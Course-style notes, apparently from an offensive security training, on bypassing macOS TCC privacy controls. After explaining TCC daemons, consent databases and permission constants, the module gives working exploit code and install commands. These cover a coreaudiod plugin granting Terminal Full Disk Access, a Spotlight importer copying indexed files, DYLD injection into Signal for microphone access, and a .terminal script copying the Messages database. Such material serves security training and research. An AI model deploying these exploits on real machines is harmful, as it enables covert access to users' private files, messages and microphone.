# Module 9: TCC Bypass

## TCC Internals

TCC (Transparency, Consent, and Control) limits access to sensitive resources (camera, microphone, contacts, files).

**Daemon:** `/System/Library/PrivateFrameworks/TCC.framework/Resources/tccd`
- System-wide daemon runs as root (configured in `com.apple.tccd.system.plist`)
- Per-user daemon runs as logged-in user (configured in `com.apple.tccd.plist`)
- Both register Mach XPC service names for handling client requests

## Consent Databases

| Database | Path | Protection |
|----------|------|------------|
| System-wide | `/Library/Application Support/com.apple.TCC/TCC.db` | SIP-protected, only tccd can modify |
| Per-user | `~/Library/Application Support/com.apple.TCC/TCC.db` | Less protected, editable via GUI/user intent |

**Schema (access table):**
```sql
CREATE TABLE access (
  service TEXT NOT NULL,        -- kTCCService* constant
  client TEXT NOT NULL,         -- bundle ID of application
  client_type INTEGER NOT NULL,
  auth_value INTEGER NOT NULL,  -- 2=granted, 0=denied
  auth_reason INTEGER NOT NULL,
  auth_version INTEGER NOT NULL,
  csreq BLOB,                   -- code signing requirement (binary)
  policy_id INTEGER,
  indirect_object_identifier TEXT NOT NULL DEFAULT 'UNUSED',
  flags INTEGER,
  last_modified INTEGER NOT NULL DEFAULT (CAST(strftime('%s','now') AS INTEGER)),
  PRIMARY KEY (service, client, client_type, indirect_object_identifier)
);
```

**Query examples:**
```bash
# Open user database
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db

# Show granted permissions for an app
select * from access where client LIKE "%zoom%" and auth_value=2;

# Show denied permissions
select * from access where client LIKE "%zoom%" and auth_value=0;

# Extract csreq blob
select hex(csreq) from access where client LIKE "%zoom%" limit 1;

# Convert hex csreq to human-readable
echo "FADE0C00..." | xxd -r -p - > zoom_csreq.bin
csreq -r zoom_csreq.bin -t
```

## kTCCService Constants

```
kTCCServiceAll                        kTCCServicePhotos
kTCCServiceAddressBook                kTCCServicePhotosAdd
kTCCServiceCalendar                   kTCCServiceMicrophone
kTCCServiceReminders                  kTCCServiceCamera
kTCCServiceLiverpool                  kTCCServiceMediaLibrary
kTCCServiceUbiquity (iCloud)          kTCCServiceSiri
kTCCServiceShareKit                   kTCCServiceAppleEvents
kTCCServiceAccessibility              kTCCServiceSystemPolicyAllFiles (FDA)
kTCCServicePostEvent                  kTCCServiceSystemPolicySysAdminFiles
kTCCServiceLocation                   kTCCServiceSystemPolicyDeveloperFile
```

**Key permissions:**
- `kTCCServiceSystemPolicyAllFiles` - Full Disk Access (FDA), includes Desktop/Downloads/Calendar
- `kTCCServiceAppleEvents` - Control other apps via Automation (privilege escalation vector)
- Apple apps use `com.apple.private.tcc.allow` entitlement for pre-granted access (no prompts)

## User Intent (com.apple.macl)

When a user drag-and-drops or selects a file, a `com.apple.macl` extended attribute is set, granting per-app access. Managed by the Sandbox kernel extension, not tccd.

```bash
xattr -l Desktop/secret.txt              # View macl attribute
macl.command Desktop/secret.txt           # Parse UUIDs from macl
```

The macl attribute is SIP-protected and cannot be cleared with `xattr -d`. Workaround: zip files, delete originals, unzip.

## Managing TCC

- Users cannot create/edit rules directly in the database (even as root)
- New rules only via prompts or System Preferences
- `tccutil` CLI can delete/query rules (not create)
- MDM profiles can manage TCC via configuration profiles

## CVE-2020-29621: Full TCC Bypass via coreaudiod

**Root cause:** coreaudiod carries two critical entitlements:
- `com.apple.security.cs.disable-library-validation` - allows loading non-Apple binaries
- `com.apple.private.tcc.manager` - full TCC management capability

Any plugin loaded into coreaudiod inherits these entitlements.

### Private TCC API

```bash
# Find exported TCC functions
nm -g /System/Library/PrivateFrameworks/TCC.framework/Versions/A/TCC | grep " T "

# Key function
_TCCAccessSetForBundleId(CFStringRef service, CFStringRef bundleId, int enabled)
# service: kTCC* value, bundleId: app bundle ID, enabled: 0=disable, 1=enable

# Find binaries using this function
rg --binary "_TCCAccessSetForBundle" /usr
```

### Exploitation - Audio Driver Plugin

```objc
#import <Foundation/Foundation.h>
#import <dlfcn.h>

int (*_TCCAccessSetForBundleId)(CFStringRef, CFStringRef, int);

__attribute__((constructor)) static void run() {
    _TCCAccessSetForBundleId = 0;
    void *tcc_framework = dlopen(
        "/System/Library/PrivateFrameworks/TCC.framework/Versions/A/TCC", RTLD_LAZY);
    _TCCAccessSetForBundleId = dlsym(tcc_framework, "TCCAccessSetForBundleId");

    NSString* bundle_id = @"com.apple.Terminal";
    NSString* tcc_right = @"kTCCServiceSystemPolicyAllFiles";
    int result = _TCCAccessSetForBundleId(
        (__bridge CFStringRef) tcc_right, (__bridge CFStringRef) bundle_id, 1);
}
```

**Installation:**
```bash
sudo mkdir /Library/Audio/Plug-Ins/HAL
sudo cp -r TCCAudioPlugin.driver /Library/Audio/Plug-Ins/HAL/
sudo chown -R root:wheel /Library/Audio/Plug-Ins/HAL/TCCAudioPlugin.driver/
sudo launchctl stop com.apple.audio.coreaudiod
sudo launchctl start com.apple.audio.coreaudiod
```

## TCC Bypass via Spotlight Importer Plugins

**Concept:** Spotlight (mds/mdworker) accesses all files for indexing. mdworker has `com.apple.security.cs.disable-library-validation`, allowing custom plugins.

- System importers: `/System/Library/Spotlight/`
- User importers: `~/Library/Spotlight/` or `/Library/Spotlight/`
- System plugins take precedence; attack works for unhandled file types (e.g., `.epub`)

**Plugin structure (Info.plist):**
```xml
<key>CFBundleDocumentTypes</key>
<array><dict>
    <key>CFBundleTypeRole</key><string>MDImporter</string>
    <key>LSItemContentTypes</key>
    <array><string>org.idpf.epub-container</string></array>
</dict></array>
```

**GetMetadataForFile exploit function** copies indexed files to user temp directory:
```objc
Boolean GetMetadataForFile(void* thisInterface, CFMutableDictionaryRef attributes,
    CFStringRef contentTypeUTI, CFStringRef pathToFile) {
    NSString* tempDir = [NSTemporaryDirectory()
        stringByAppendingPathComponent:@"epubcollection"];
    NSString *source = (__bridge NSString *)pathToFile;
    NSString *destination = [tempDir stringByAppendingPathComponent:
        [source lastPathComponent]];
    [[NSFileManager defaultManager] createDirectoryAtPath:tempDir
        withIntermediateDirectories:NO attributes:nil error:nil];
    [[NSFileManager defaultManager] copyItemAtPath:source toPath:destination error:nil];
    return TRUE;
}
```

```bash
mdimport -L | grep Offsec    # Verify importer loaded
mdimport -i /path/to/files/  # Force re-index
```

## CVE-2020-24259: Signal Microphone Access Bypass

Signal v1.33 had `com.apple.security.cs.disable-library-validation` and `com.apple.security.cs.allow-dyld-environment-variables`, enabling DYLD_INSERT_LIBRARIES injection.

**Key:** Launch via launchd (not Terminal) to inherit Signal's sandbox profile:
```xml
<dict>
    <key>Label</key><string>org.test.signal</string>
    <key>EnvironmentVariables</key><dict>
        <key>DYLD_INSERT_LIBRARIES</key><string>/tmp/signal.dylib</string>
    </dict>
    <key>ProgramArguments</key><array>
        <string>/Applications/Signal.app/Contents/MacOS/Signal</string>
    </array>
    <key>RunAtLoad</key><true/>
</dict>
```

```bash
gcc -dynamiclib -framework Foundation -framework AVFoundation signal.m -o signal.dylib
launchctl load signal-inject.plist
```

## Full Disk Access via Terminal Scripts

A `.terminal` script (PLIST) runs commands with Terminal's TCC permissions:
```xml
<dict>
    <key>CommandString</key>
    <string>cp ~/Library/Messages/chat.db /tmp/;</string>
    <key>ProfileCurrentVersion</key><real>2.0600000000000001</real>
    <key>RunCommandAsShell</key><false/>
    <key>name</key><string>exploit</string>
    <key>type</key><string>Window Settings</string>
</dict>
```

If Terminal has FDA (common on dev/sysadmin machines), any app can write and open a `.terminal` script to access protected files. Apple considers this expected behavior.
